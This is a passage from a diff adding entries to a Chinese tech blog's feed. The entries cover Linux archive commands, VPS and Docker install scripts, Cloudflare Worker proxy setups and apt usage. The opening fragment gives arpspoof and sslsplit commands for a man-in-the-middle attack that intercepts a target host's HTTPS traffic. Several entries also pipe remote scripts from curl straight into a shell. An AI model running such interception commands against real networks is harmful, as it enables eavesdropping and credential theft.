-L</span><br></pre></td></tr></table></figure><h1 id="5、-Arp欺骗-，截获目标主机的网络流量"><a href="#5、-Arp欺骗-，截获目标主机的网络流量" class="headerlink" title="5、 Arp欺骗 ，截获目标主机的网络流量"></a>5、 Arp欺骗 ，截获目标主机的网络流量</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">arpspoof -i eth0 -t 目标IP -r 目标主机网关</span><br><span class="line">arpspoof -i eth0 -t 192.168.88.130 -r 192.168.88.2</span><br></pre></td></tr></table></figure><h1 id="6、启动SSLsplit进行攻击"><a href="#6、启动SSLsplit进行攻击" class="headerlink" title="6、启动SSLsplit进行攻击"></a>6、启动SSLsplit进行攻击</h1><h2 id="1、创建目录"><a href="#1、创建目录" class="headerlink" title="1、创建目录"></a>1、创建目录</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> -p <span class="built_in">test</span>/logdir</span><br></pre></td></tr></table></figure><h2 id="2、侦听设定的端口"><a href="#2、侦听设定的端口" class="headerlink" title="2、侦听设定的端口"></a>2、侦听设定的端口</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sslsplit -D -l connect.log -j /root/test -S /root/test/logdir/ -k ca.key -c ca.crt ssl 0.0.0.0 8443 tcp 0.0.0.0 8080</span><br></pre></td></tr></table></figure><p>根目录下出现一个test文件夹 </p><p>伪造成功后，目标机访问https的网站，会出现“安全证书有问题的错误”，点击继续访问后，访问信息被记录在connect.log中，且在test&#x2F;logdir可查看传输数据</p>]]></content>
+    
+    
+    <summary type="html">sslsplit</summary>
+    
+    
+    
+    <category term="os" scheme="https://macin.top/categories/os/"/>
+    
+    <category term="kali" scheme="https://macin.top/categories/os/kali/"/>
+    
+    <category term="hack" scheme="https://macin.top/categories/hack/"/>
+    
+    
+    <category term="os" scheme="https://macin.top/tags/os/"/>
+    
+    <category term="kali" scheme="https://macin.top/tags/kali/"/>
+    
+    <category term="hack" scheme="https://macin.top/tags/hack/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>linux常用解压与压缩命令</title>
+    <link href="https://macin.top/posts/8e8fbaa2/"/>
+    <id>https://macin.top/posts/8e8fbaa2/</id>
+    <published>2024-12-16T12:24:28.000Z</published>
+    <updated>2024-12-19T15:25:35.224Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="tar-文件"><a href="#tar-文件" class="headerlink" title=".tar 文件"></a>.tar 文件</h1><p>仅打包，并非压缩</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">tar -xvf FileName.tar         <span class="comment"># 解包 </span></span><br><span class="line"></span><br><span class="line">tar -cvf FileName.tar DirName <span class="comment"># 将DirName和其下所有文件（夹）打包</span></span><br></pre></td></tr></table></figure><h1 id="gz文件"><a href="#gz文件" class="headerlink" title=".gz文件"></a>.gz文件</h1><p>.gz</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">gunzip FileName.gz  <span class="comment"># 解压1 </span></span><br><span class="line"></span><br><span class="line">gzip -d FileName.gz <span class="comment"># 解压2 </span></span><br><span class="line"></span><br><span class="line">gzip FileName       <span class="comment"># 压缩，只能压缩文件</span></span><br></pre></td></tr></table></figure><h1 id="tar-gz文件和-tgz文件"><a href="#tar-gz文件和-tgz文件" class="headerlink" title=".tar.gz文件和.tgz文件"></a>.tar.gz文件和.tgz文件</h1><p>.tar.gz 和 .tgz</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">tar -zxvf FileName.tar.gz               <span class="comment"># 解压 </span></span><br><span class="line"></span><br><span class="line">tar -zcvf FileName.tar.gz DirName       <span class="comment"># 将DirName和其下所有文件（夹）压缩 </span></span><br><span class="line"></span><br><span class="line">tar -C DesDirName -zxvf FileName.tar.gz <span class="comment"># 解压到目标路径</span></span><br></pre></td></tr></table></figure><h1 id="zip文件"><a href="#zip文件" class="headerlink" title=".zip文件"></a>.zip文件</h1><p>感觉.zip占用空间比.tar.gz大</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">unzip FileName.zip          <span class="comment"># 解压 </span></span><br><span class="line"></span><br><span class="line">zip FileName.zip DirName    <span class="comment"># 将DirName本身压缩 </span></span><br><span class="line"></span><br><span class="line">zip -r FileName.zip DirName <span class="comment"># 压缩，递归处理，将指定目录下的所有文件和子目录一并压缩</span></span><br></pre></td></tr></table></figure><h1 id="rar文件"><a href="#rar文件" class="headerlink" title=".rar文件"></a>.rar文件</h1><p>mac和linux并没有自带rar，需要去下载</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">rar x FileName.rar      <span class="comment"># 解压 </span></span><br><span class="line"></span><br><span class="line">rar a FileName.rar DirName <span class="comment"># 压缩 .tar是打包</span></span><br></pre></td></tr></table></figure><p>.tar.gz才是压缩过的文件，</p><p>.tar.gz常见于unix系统，</p><p>在ubuntu或macos可以直接解压，</p><p>而.zip常见于windows系统</p>]]></content>
+    
+    
+      
+      
+        
+        
+    <summary type="html">&lt;h1 id=&quot;tar-文件&quot;&gt;&lt;a href=&quot;#tar-文件&quot; class=&quot;headerlink&quot; title=&quot;.tar 文件&quot;&gt;&lt;/a&gt;.tar 文件&lt;/h1&gt;&lt;p&gt;仅打包，并非压缩&lt;/p&gt;
+&lt;figure class=&quot;highlight</summary>
+        
+      
+    
+    
+    
+    <category term="os" scheme="https://macin.top/categories/os/"/>
+    
+    <category term="centos" scheme="https://macin.top/categories/os/centos/"/>
+    
+    <category term="ubuntu" scheme="https://macin.top/categories/os/ubuntu/"/>
+    
+    <category term="debian" scheme="https://macin.top/categories/os/debian/"/>
+    
+    <category term="kali" scheme="https://macin.top/categories/os/kali/"/>
+    
+    
+    <category term="os" scheme="https://macin.top/tags/os/"/>
+    
+    <category term="ubuntu" scheme="https://macin.top/tags/ubuntu/"/>
+    
+    <category term="debian" scheme="https://macin.top/tags/debian/"/>
+    
+    <category term="centos" scheme="https://macin.top/tags/centos/"/>
+    
+    <category term="kali" scheme="https://macin.top/tags/kali/"/>
+    
+    <category term="linux" scheme="https://macin.top/tags/linux/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>科技lion脚本工具</title>
+    <link href="https://macin.top/posts/c073f5ea/"/>
+    <id>https://macin.top/posts/c073f5ea/</id>
+    <published>2024-12-16T12:02:26.000Z</published>
+    <updated>2024-12-19T15:25:35.230Z</updated>
+    
+    <content type="html"><![CDATA[<p>科技Lion的Shell脚本工具是一款全能脚本工具箱，使用shell脚本编写。专为Linux服务器监控、测试和管理而设计。无论您是初学者还是经验丰富的用户，该工具都能为您提供便捷的解决方案。集成了独创的Docker管理功能，让您轻松管理容器化应用；LNMP建站解决方案能帮助您快速搭建网站，站点优化，防御，备份还原迁移一应俱全；并且整合了各类系统工具面板的安装及使用，使系统维护变得更加简单。我们的目标是成为全网最优秀的VPS一键脚本工具，为用户提供高效、便捷的科技支持。</p><h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h2><h3 id="安装基础组件"><a href="#安装基础组件" class="headerlink" title="安装基础组件"></a>安装基础组件</h3><p><strong>Debian&#x2F;Ubuntu</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt update -y &amp;&amp; apt install -y curl</span><br></pre></td></tr></table></figure><p><strong>CentOS&#x2F;RedHat&#x2F;Fedora&#x2F;AlmaLinux&#x2F;Rocky Linux</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum update &amp;&amp; yum install -y curl</span><br></pre></td></tr></table></figure><p><strong>Alpine Linux</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apk update &amp;&amp; apk add curl</span><br></pre></td></tr></table></figure><h3 id="运行脚本"><a href="#运行脚本" class="headerlink" title="运行脚本"></a>运行脚本</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash &lt;(curl -sL kejilion.sh)</span><br></pre></td></tr></table></figure><h2 id="脚本主界面"><a href="#脚本主界面" class="headerlink" title="脚本主界面"></a><strong>脚本主界面</strong></h2><p>脚本全面支持Ubuntu、Debian，Cent OS和Alpine Linux系统</p><p>只要执行命令自动获取最新版本</p><h2 id="主要功能"><a href="#主要功能" class="headerlink" title="主要功能"></a>主要功能</h2><h4 id="docker管理器"><a href="#docker管理器" class="headerlink" title="docker管理器"></a><strong>docker管理器</strong></h4><p>轻松安装管理你的docker容器，无需安装任何可视化面板。操作优雅直觉！</p><h4 id="LDNMP建站"><a href="#LDNMP建站" class="headerlink" title="LDNMP建站"></a><strong>LDNMP建站</strong></h4><p>LDNMP建站系统，超凡的快速建站方案，多站共存都是一键搞定。站点管理防护优化一应俱全。</p><h4 id="面板工具集合"><a href="#面板工具集合" class="headerlink" title="面板工具集合"></a><strong>面板工具集合</strong></h4><p>集合了时下流行的VPS面板应用程序，一键快速搭建。安装完成即可使用。安装后动态管理已安装的面板应用。</p><h4 id="系统工具集合"><a href="#系统工具集合" class="headerlink" title="系统工具集合"></a><strong>系统工具集合</strong></h4><p>集合了对Linux各项系统管理等基础操作，方便小伙伴优雅使用。调整VPS参数不需要记住繁琐命令，一键搞定。</p><h4 id="更多功能"><a href="#更多功能" class="headerlink" title="更多功能"></a><strong>更多功能</strong></h4><p>还有更多功能等待着大家自己发掘。欢迎提供宝贵意见，希望一键化脚本工具越来越强大。帮助小伙伴们使用VPS管理VPS。</p><p>转自<a href="https://blog.kejilion.pro/kejilion-sh/">科技lion一键脚本 Linux服务器运维工具箱 监控管理建站一个脚本全搞定！</a></p>]]></content>
+    
+    
+    <summary type="html">linux,os,debian,ubuntu,kali</summary>
+    
+    
+    
+    <category term="os" scheme="https://macin.top/categories/os/"/>
+    
+    <category term="ubuntu" scheme="https://macin.top/categories/os/ubuntu/"/>
+    
+    <category term="debian" scheme="https://macin.top/categories/os/debian/"/>
+    
+    <category term="kali" scheme="https://macin.top/categories/os/kali/"/>
+    
+    
+    <category term="os" scheme="https://macin.top/tags/os/"/>
+    
+    <category term="ubuntu" scheme="https://macin.top/tags/ubuntu/"/>
+    
+    <category term="debian" scheme="https://macin.top/tags/debian/"/>
+    
+    <category term="centos" scheme="https://macin.top/tags/centos/"/>
+    
+    <category term="kali" scheme="https://macin.top/tags/kali/"/>
+    
+    <category term="linux" scheme="https://macin.top/tags/linux/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>kali安装docker报错另一种方法解决</title>
+    <link href="https://macin.top/posts/9264edc1/"/>
+    <id>https://macin.top/posts/9264edc1/</id>
+    <published>2024-12-16T11:41:57.000Z</published>
+    <updated>2024-12-19T15:25:35.223Z</updated>
+    
+    <content type="html"><![CDATA[<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -s https://get.docker.com/ | sh</span><br></pre></td></tr></table></figure><p>但是在执行该语句的过程中，会报错，内容是：</p><p>E: The repository ‘<a href="https://download.docker.com/linux/debian">https://download.docker.com/linux/debian</a> kali-rolling Release’ does not have a Release file.</p><p>试了很多方法，都没有用。比如：换源、更改将kali-rolling换成debain对应的别称等等，都没用。后来换了手动安装的方式，过程中没有出现任何问题。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">apt install docker.io </span><br><span class="line"></span><br><span class="line">apt install docker-compose </span><br></pre></td></tr></table></figure><p>就这样，docker安装完成了。</p><p>补充：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#启动docker： </span></span><br><span class="line">service docker start</span><br><span class="line"></span><br><span class="line"><span class="comment">#停止docker： </span></span><br><span class="line">service docker stop</span><br><span class="line"></span><br><span class="line"><span class="comment">#查看docker状态：</span></span><br><span class="line">systemctl status docker</span><br><span class="line"></span><br><span class="line"><span class="comment">#开机自动启动</span></span><br><span class="line">systemctl <span class="built_in">enable</span> docker.service</span><br></pre></td></tr></table></figure>]]></content>
+    
+    
+    <summary type="html">kali,ubuntu,os,linux,docker,debian</summary>
+    
+    
+    
+    <category term="tools" scheme="https://macin.top/categories/tools/"/>
+    
+    <category term="docker" scheme="https://macin.top/categories/tools/docker/"/>
+    
+    <category term="os" scheme="https://macin.top/categories/os/"/>
+    
+    <category term="ubuntu" scheme="https://macin.top/categories/os/ubuntu/"/>
+    
+    <category term="debian" scheme="https://macin.top/categories/os/debian/"/>
+    
+    <category term="kali" scheme="https://macin.top/categories/os/kali/"/>
+    
+    
+    <category term="docker" scheme="https://macin.top/tags/docker/"/>
+    
+    <category term="os" scheme="https://macin.top/tags/os/"/>
+    
+    <category term="ubuntu" scheme="https://macin.top/tags/ubuntu/"/>
+    
+    <category term="debian" scheme="https://macin.top/tags/debian/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>CF-Workers-docker.io：Docker仓库镜像代理工具</title>
+    <link href="https://macin.top/posts/19a7202a/"/>
+    <id>https://macin.top/posts/19a7202a/</id>
+    <published>2024-12-15T14:14:51.000Z</published>
+    <updated>2024-12-19T15:25:35.219Z</updated>
+    
+    <content type="html"><![CDATA[<p>项目地址：<a href="https://github.com/cmliu/CF-Workers-docker.io">https://github.com/cmliu/CF-Workers-docker.io</a></p><p>本项目是一个基于 Cloudflare Workers 的 Docker 镜像代理工具，旨在中转对 Docker 官方镜像仓库的请求，解决访问限制并加速访问。</p><h2 id="为什么需要这个工具？"><a href="#为什么需要这个工具？" class="headerlink" title="为什么需要这个工具？"></a>为什么需要这个工具？</h2><p>由于<strong>神秘原因</strong>，国内用户逐渐无法访问Docker Hub仓库。这对于开发者来说是个不小的难题。</p><p>而我的解决方案是通过<strong>赛博菩萨</strong>中转请求，解决访问限制并加速访问。</p><p>注意：<strong>不推荐使用该项目搭建公共服务</strong>。使用你自己的域名搭建公共服务有可能会遭受<strong>污染和反诈</strong>，推荐小规模自用即可。</p><hr><h2 id="部署方式"><a href="#部署方式" class="headerlink" title="部署方式"></a>部署方式</h2><p>访问<a href="https://github.com/cmliu/CF-Workers-docker.io">CF-Workers-docker.io：Docker仓库镜像代理工具</a>项目页面</p><ul><li><strong>Workers</strong> 部署：复制 <a href="https://github.com/cmliu/CF-Workers-docker.io/blob/main/_worker.js">_worker.js</a> 代码，<code>保存并部署</code>即可</li><li><strong>Pages</strong> 部署：<code>Fork</code> 后 <code>连接GitHub</code> 一键部署即可</li></ul><hr><h2 id="如何使用？"><a href="#如何使用？" class="headerlink" title="如何使用？"></a>如何使用？</h2><p>例如您的Workers项目域名为：<code>docker.fxxk.dedyn.io</code>；</p><h3 id="1-官方镜像路径前面加域名"><a href="#1-官方镜像路径前面加域名" class="headerlink" title="1.官方镜像路径前面加域名"></a>1.官方镜像路径前面加域名</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker pull docker.fxxk.dedyn.io/stilleshan/frpc:latest</span><br><span class="line"></span><br><span class="line">docker pull docker.fxxk.dedyn.io/library/nginx:stable-alpine3.19-perl</span><br></pre></td></tr></table></figure><h3 id="2-一键设置镜像加速"><a href="#2-一键设置镜像加速" class="headerlink" title="2.一键设置镜像加速"></a>2.一键设置镜像加速</h3><p>修改文件 <code>/etc/docker/daemon.json</code>（如果不存在则创建）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">sudo <span class="built_in">mkdir</span> -p /etc/docker</span><br><span class="line">sudo <span class="built_in">tee</span> /etc/docker/daemon.json &lt;&lt;-<span class="string">&#x27;EOF&#x27;</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;registry-mirrors&quot;</span>: [<span class="string">&quot;https://docker.fxxk.dedyn.io&quot;</span>]  <span class="comment"># 请替换为您自己的Worker自定义域名</span></span><br><span class="line">&#125;</span><br><span class="line">EOF</span><br><span class="line">sudo systemctl daemon-reload</span><br><span class="line">sudo systemctl restart docker</span><br></pre></td></tr></table></figure><hr><h2 id="变量说明"><a href="#变量说明" class="headerlink" title="变量说明"></a>变量说明</h2><table><thead><tr><th>变量名</th><th>示例</th><th>必填</th><th>备注</th></tr></thead><tbody><tr><td>URL302</td><td><a href="https://macin.top/">https://macin.top</a></td><td>❌</td><td>主页302跳转</td></tr><tr><td>URL</td><td>nginx</td><td>❌</td><td>主页伪装(设为<code>nginx</code>则伪装为nginx默认页面)</td></tr></tbody></table><p>转载自<a href="https://cmliussss.com/p/CF-Workers-docker.io/">CMLiussss Blog - CM喂饭干货满满</a></p>]]></content>
+    
+    
+    <summary type="html">docker</summary>
+    
+    
+    
+    <category term="tools" scheme="https://macin.top/categories/tools/"/>
+    
+    <category term="docker" scheme="https://macin.top/categories/tools/docker/"/>
+    
+    
+    <category term="tools" scheme="https://macin.top/tags/tools/"/>
+    
+    <category term="docker" scheme="https://macin.top/tags/docker/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>永不被盗的订阅转换方法！使用worker搭建永久免费的私人反代订阅转换服务</title>
+    <link href="https://macin.top/posts/7a74d415/"/>
+    <id>https://macin.top/posts/7a74d415/</id>
+    <published>2024-12-13T14:09:55.000Z</published>
+    <updated>2024-12-19T15:25:35.230Z</updated>
+    
+    <content type="html"><![CDATA[<p>项目地址：<a href="https://www.youtube.com/redirect?event=video_description&redir_token=QUFFLUhqbjNDT3JQeGZuaWVqT2Y3T0Y3NGcwTjdublIyd3xBQ3Jtc0trR3c3Zm85UmlKeHA0S0p5N0k3Y1FnY0cwa2F5Nm1uV3AxdHJ5d21QcXFySWJBejVMUEttTUotbjBNWEFmemQwMC1MT0tHTWtCckdaZjFycF96emJuR3FGZm4zbV83cHQ0UjZPRkt5c0pvM0dVTDRPWQ&q=https://github.com/bulianglin/psub&v=X7CC5jrgazo">https://github.com/bulianglin/psub</a> </p><p>CF Worker：<a href="https://www.youtube.com/redirect?event=video_description&redir_token=QUFFLUhqbHRHY3h5MFJjcEJpTmxYT1NSMGFLeTlSNkF3UXxBQ3Jtc0tuTmhJQnAwWENqZGNwY0xLSnNiZVdKbTBNdXhlcExxVmVuMHRtaW1qNzRZTlhNbGdxOVE4aTZJVGw2OWJsTUt0WkR5ZHN4bHM2QVlzLWRIcGZtZ0J4aHlmbk5FTVpWejV3MnAzUDM5YlNlTkY0X19KQQ&q=https://cloudflare.com/&v=X7CC5jrgazo">https://cloudflare.com</a></p><h1 id="psub"><a href="#psub" class="headerlink" title="psub"></a>psub</h1><p>利用CF Worker搭建的反代订阅转换工具，通过随机化服务器地址和节点账号密码，解决用户转换订阅的隐私问题</p><h3 id="演示网站"><a href="#演示网站" class="headerlink" title="演示网站"></a>演示网站</h3><p><a href="https://psub.888005.xyz/">https://psub.888005.xyz</a></p><h3 id="视频教程"><a href="#视频教程" class="headerlink" title="视频教程"></a>视频教程</h3><p><a href="https://youtu.be/X7CC5jrgazo">https://youtu.be/X7CC5jrgazo</a></p><p>环境变量名：<code>BACKEND</code></p><p>KV或R2变量名：<code>SUB_BUCKET</code></p><h3 id="支持反代转换的协议"><a href="#支持反代转换的协议" class="headerlink" title="支持反代转换的协议"></a>支持反代转换的协议</h3><ul><li>shadowsocks</li><li>shadowsocksR</li><li>vmess</li><li>trojan</li><li>vless(取决于后端)</li><li>hysteria(取决于后端)</li></ul><h3 id="教程："><a href="#教程：" class="headerlink" title="教程："></a>教程：</h3><p>1.创建workers，重命名，部署</p><p>2.编辑代码</p><p>打开并复制下面的js代码，粘贴覆盖workers原本的演示代码，保存并部署</p><p> <a href="/img/worker.js">worker.js</a> </p><p>3.设置，变量，添加环境变量</p><p>变量和机密</p><p>为运行时使用的 Worker 定义环境变量和机密</p><table><thead><tr><th align="center">类型</th><th align="center">名称</th><th align="center">值</th></tr></thead><tbody><tr><td align="center">纯文本</td><td align="center">BACKEND</td><td align="center">先检查网上能用的后端网址再填入，例如：<a href="https://yun-api.subcloud.xyz/">https://yun-api.subcloud.xyz</a></td></tr></tbody></table><p>创建KV命名空间，重命名</p><p>绑定</p><p>定义 Worker 可用的资源集</p><table><thead><tr><th align="center">类型</th><th align="center">名称</th><th align="center">值</th></tr></thead><tbody><tr><td align="center">KV 命名空间</td><td align="center">SUB_BUCKET</td><td align="center">sub</td></tr></tbody></table>]]></content>
+    
+    
+    <summary type="html">clash,hack,proxy</summary>
+    
+    
+    
+    <category term="proxy" scheme="https://macin.top/categories/proxy/"/>
+    
+    <category term="clash" scheme="https://macin.top/categories/proxy/clash/"/>
+    
+    
+    <category term="proxy" scheme="https://macin.top/tags/proxy/"/>
+    
+    <category term="hack" scheme="https://macin.top/tags/hack/"/>
+    
+    <category term="clash" scheme="https://macin.top/tags/clash/"/>
+    
+    <category term="leak" scheme="https://macin.top/tags/leak/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>apt和apt-get的区别（建议使用apt）</title>
+    <link href="https://macin.top/posts/2f16ba33/"/>
+    <id>https://macin.top/posts/2f16ba33/</id>
+    <published>2024-12-12T12:32:37.000Z</published>
+    <updated>2024-12-19T15:25:35.220Z</updated>
+    
+    <content type="html"><![CDATA[<p>Ubuntu 16.04 发布时，一个引人注目的新特性便是 apt 命令的引入。其实<strong>早在 2014 年，apt 命令就已经发布了第一个稳定版</strong>，只是直到 2016 年的 Ubuntu 16.04 系统发布时才开始引人关注。</p><p>随着 apt install package 命令的使用频率和普遍性逐步超过 apt-get install package，越来越多的其它 Linux 发行版也开始遵循 Ubuntu 的脚步，开始鼓励用户使用 apt 而不是 apt-get。</p><p>那么，apt-get 与 apt 命令之间到底有什么区别呢？如果它们有类似的命令结构，为什么还需要新的 apt 命令呢？是否 apt 真的比 apt-get 更好？普通用户应该使用新的 apt 命令还是坚持旧有习惯继续使用 apt-get 呢？</p><h3 id="apt与apt-get"><a href="#apt与apt-get" class="headerlink" title="apt与apt-get"></a>apt与apt-get</h3><p>在开始对比 apt 与 apt-get 命令的区别之前，我们先来看看这两个命令的背景，以及它们要试图达到的目的。</p><p>Debian 作为 Ubuntu、Linux Mint 和 elementary OS 等 Linux 操作系统的母板，其具有强健的「包管理」系统，它的每个组件和应用程序都内置在系统中安装的软件包中。Debian 使用一套名为 Advanced Packaging Tool（APT）的工具来管理这种包系统，不过请不要把它与 apt 命令混淆，它们之间是其实不是同一个东西。</p><p>在基于 Debian 的 Linux 发行版中，有各种工具可以与 APT 进行交互，以方便用户安装、删除和管理的软件包。apt-get 便是其中一款广受欢迎的命令行工具，另外一款较为流行的是 Aptitude 这一命令行与 GUI 兼顾的小工具。</p><p>如果你已阅读过我们的 <a href="https://www.sysgeek.cn/linux-package-management/">apt-get 命令指南</a>，可能已经遇到过许多类似的命令，如apt-cache、apt-config 等。如你所见，这些命令都比较低级又包含众多功能，普通的 Linux 用户也许永远都不会使用到。换种说法来说，就是最常用的 Linux 包管理命令都被分散在了 apt-get、apt-cache 和 apt-config 这三条命令当中。</p><p>apt 命令的引入就是为了解决命令过于分散的问题，它包括了 apt-get 命令出现以来使用最广泛的功能选项，以及 apt-cache 和 apt-config 命令中很少用到的功能。</p><p>在使用 apt 命令时，用户不必再由 apt-get 转到 apt-cache 或 apt-config，而且 apt 更加结构化，并为用户提供了管理软件包所需的必要选项。</p><p><strong>简单来说就是：apt &#x3D; apt-get、apt-cache 和 apt-config 中最常用命令选项的集合。</strong></p><h4 id="apt与apt-get之间的区别"><a href="#apt与apt-get之间的区别" class="headerlink" title="apt与apt-get之间的区别"></a>apt与apt-get之间的区别</h4><p>通过 apt 命令，用户可以在同一地方集中得到所有必要的工具，apt 的主要目的是提供一种以「让终端用户满意」的方式来处理 Linux 软件包的有效方式。</p><p>apt 具有更精减但足够的命令选项，而且参数选项的组织方式更为有效。除此之外，它默认启用的几个特性对最终用户也非常有帮助。例如，可以在使用 apt 命令安装或删除程序时看到进度条。</p><p>apt 还会在更新存储库数据库时提示用户可升级的软件包个数。</p><p>如果你使用 apt 的其它命令选项，也可以实现与使用 apt-get 时相同的操作。</p><h4 id="apt和apt-get命令之间的区别"><a href="#apt和apt-get命令之间的区别" class="headerlink" title="apt和apt-get命令之间的区别"></a>apt和apt-get命令之间的区别</h4><p>虽然 apt 与 apt-get 有一些类似的命令选项，但它并不能完全向下兼容 apt-get 命令。也就是说，可以用 apt 替换部分 apt-get 系列命令，但不是全部。</p><table><thead><tr><th align="left">apt 命令</th><th align="left">取代的命令</th><th align="left">命令的功能</th></tr></thead><tbody><tr><td align="left">apt install</td><td align="left">apt-get install</td><td align="left">安装软件包</td></tr><tr><td align="left">apt remove</td><td align="left">apt-get remove</td><td align="left">移除软件包</td></tr><tr><td align="left">apt purge</td><td align="left">apt-get purge</td><td align="left">移除软件包及配置文件</td></tr><tr><td align="left">apt update</td><td align="left">apt-get update</td><td align="left">刷新存储库索引</td></tr><tr><td align="left">apt upgrade</td><td align="left">apt-get upgrade</td><td align="left">升级所有可升级的软件包</td></tr><tr><td align="left">apt autoremove</td><td align="left">apt-get autoremove</td><td align="left">自动删除不需要的包</td></tr><tr><td align="left">apt full-upgrade</td><td align="left">apt-get dist-upgrade</td><td align="left">在升级软件包时自动处理依赖关系</td></tr><tr><td align="left">apt search</td><td align="left">apt-cache search</td><td align="left">搜索应用程序</td></tr><tr><td align="left">apt show</td><td align="left">apt-cache show</td><td align="left">显示装细节</td></tr></tbody></table><p>当然，apt 还有一些自己的命令：</p><table><thead><tr><th align="left">新的apt命令</th><th align="left">命令的功能</th></tr></thead><tbody><tr><td align="left">apt list</td><td align="left">列出包含条件的包（已安装，可升级等）</td></tr><tr><td align="left">apt edit-sources</td><td align="left">编辑源列表</td></tr></tbody></table><p>需要大家注意的是：apt 命令也还在不断发展， 因此，你可能会在将来的版本中看到新的选项。</p><h3 id="apt-get已弃用？"><a href="#apt-get已弃用？" class="headerlink" title="apt-get已弃用？"></a>apt-get已弃用？</h3><p>目前还没有任何 Linux 发行版官方放出 apt-get 将被停用的消息，至少它还有比 apt 更多、更细化的操作功能。对于低级操作，仍然需要 apt-get。</p><h3 id="我应该使用apt还是apt-get？"><a href="#我应该使用apt还是apt-get？" class="headerlink" title="我应该使用apt还是apt-get？"></a>我应该使用apt还是apt-get？</h3><p>既然两个命令都有用，那么我该使用 apt 还是 apt-get 呢？作为一个常规 Linux 用户，系统极客建议大家尽快适应并开始首先使用 apt。不仅因为广大 Linux 发行商都在推荐 apt，更主要的还是它提供了 Linux 包管理的必要选项。</p><p>最重要的是，apt 命令选项更少更易记，因此也更易用，所以没理由继续坚持 apt-get。</p><h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>最后结大家提供两点使用上的建议：</p><p>apt 可以看作 apt-get 和 apt-cache 命令的子集, 可以为包管理提供必要的命令选项。</p><p>apt-get 虽然没被弃用，但作为普通用户，还是应该首先使用 apt。</p><p>以上原文链接：<a href="https://www.sysgeek.cn/apt-vs-apt-get/">Linux中apt与apt-get命令的区别与解释 - 系统极客</a></p><p><strong>顺便补充下apt-get和yum区别：</strong></p><p>一般来说著名的linux系统基本上分两大类：</p><p>1、RedHat系列：Redhat、Centos、Fedora等</p><p>2、Debian系列：Debian、Ubuntu等</p><p>RedHat 系列 </p><p>1、常见的安装包格式 rpm包，安装rpm包的命令是“rpm -参数” </p><p>2、包管理工具 yum </p><p>3、支持tar包</p><p>Debian系列 </p><p>1、常见的安装包格式 deb包，安装deb包的命令是“dpkg -参数” </p><p>2、包管理工具 apt-get </p><p>3、支持tar包</p><p>tar 只是一种压缩文件格式，所以，它只是把文件压缩打包而已。 </p><p>rpm 相当于windows中的安装文件，它会自动处理软件包之间的依赖关系。 </p><p>优缺点来说，rpm一般都是预先编译好的文件，它可能已经绑定到某种CPU或者发行版上面了。 </p><p>tar一般包括编译脚本，你可以在你的环境下编译，所以具有通用性。 </p><p>如果你的包不想开放源代码，你可以制作成rpm，如果<a href="https://edu.csdn.net/cloud/pm_summit?utm_source=blogglc&spm=1001.2101.3001.7020">开源</a>，用tar更方便了。 </p><p>tar一般都是源码打包的软件，需要自己解包，然后进行安装三部曲，.&#x2F;configure, make, make install. 来安装软件。</p><p>rpm是redhat公司的一种软件包管理机制，直接通过rpm命令进行安装删除等操作，最大的优点是自己内部自动处理了各种软件包可能的依赖关系。</p>]]></content>
+    
+    
+    <summary type="html">debian,os,ubuntu,linux</summary>
+    
+    
+    
